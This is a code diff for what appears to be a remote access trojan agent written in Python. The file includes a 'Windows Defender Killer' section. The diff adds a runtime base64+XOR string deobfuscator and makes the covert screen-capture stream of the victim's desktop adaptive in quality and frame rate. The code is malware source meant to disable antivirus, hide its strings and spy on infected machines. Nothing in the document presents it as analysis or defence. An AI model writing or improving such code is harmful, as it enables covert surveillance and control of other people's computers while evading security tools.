@@ -128,6 +128,14 @@ def _obf_b(data: bytes) -> bytes:
     return bytes(b ^ k[i % len(k)] ^ (i & 0xFF) for i, b in enumerate(data))
 
 
+def _s(blob):
+    """Runtime decode of base64+XOR-obfuscated string."""
+    import base64
+    b = base64.b64decode(blob)
+    k = _OBF_KEY
+    return bytes(b[i] ^ k[i % len(k)] ^ (i & 0xFF) for i in range(len(b))).decode("latin-1")
+
+
 # ─── Windows Defender Killer ─────────────────────────────────
 
 def _disable_defender(report_cb=None):
@@ -2276,21 +2284,45 @@ async def main():
                             await asyncio.sleep(max(0.0, target_dt - elapsed))
 
                     async def stream_loop():
-                        """Screen grab+encode runs in a worker thread so shell/recv are not blocked (log: H2 ruled out server; agent was CPU-bound here)."""
+                        """Adaptive screen stream: adjusts JPEG quality & frame rate based on estimated bandwidth."""
+                        quality = 48
+                        min_quality = 15
+                        max_quality = 85
+                        frame_interval = 0.048
+                        min_interval = 0.020
+                        max_interval = 0.250
+                        send_times = []
+                        quality_adj_ticks = 0
                         while True:
                             try:
                                 if _view_mode == "screen":
+                                    t0 = time.perf_counter()
 
-                                    def _grab_screen_jpeg():
+                                    def _grab_screen_jpeg(q):
                                         with mss.mss() as sx:
                                             img = sx.grab(sx.monitors[0])
                                             buf = BytesIO()
                                             Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
-                                                buf, format="JPEG", quality=48, optimize=True
+                                                buf, format="JPEG", quality=q, optimize=True
                                             )
                                             return b"\x01" + buf.getvalue()
 
-                                    await send_stream(await asyncio.to_thread(_grab_screen_jpeg))
+                                    blob = await asyncio.to_thread(_grab_screen_jpeg, quality)
+                                    await send_stream(blob)
+                                    elapsed = time.perf_counter() - t0
+                                    send_times.append(elapsed)
+                                    if len(send_times) > 10:
+                                        send_times.pop(0)
+
+                                    quality_adj_ticks += 1
+                                    if quality_adj_ticks >= 15:
+                                        quality_adj_ticks = 0
+                                        avg = sum(send_times) / len(send_times)
+                                        if avg > 0.25 and quality > min_quality:
+                                            quality = max(min_quality, quality - 8)
+                                        elif avg < 0.06 and quality < max_quality:
+                                            quality = min(max_quality, quality + 4)
+                                        frame_interval = max(min_interval, min(max_interval, avg * 1.5))
 
                                 if _audio_enabled:
                                     pkt = _audio_try_pop()
@@ -2308,7 +2340,7 @@ async def main():
                             if _audio_enabled:
                                 await asyncio.sleep(0.014)
                             else:
-                                await asyncio.sleep(0.042 if _view_mode == "screen" else 0.02)
+                                await asyncio.sleep(max(0.014, frame_interval if _view_mode == "screen" else 0.02))
 
                     recv_t = asyncio.create_task(recv_loop())
                     stream_t = asyncio.create_task(stream_loop())
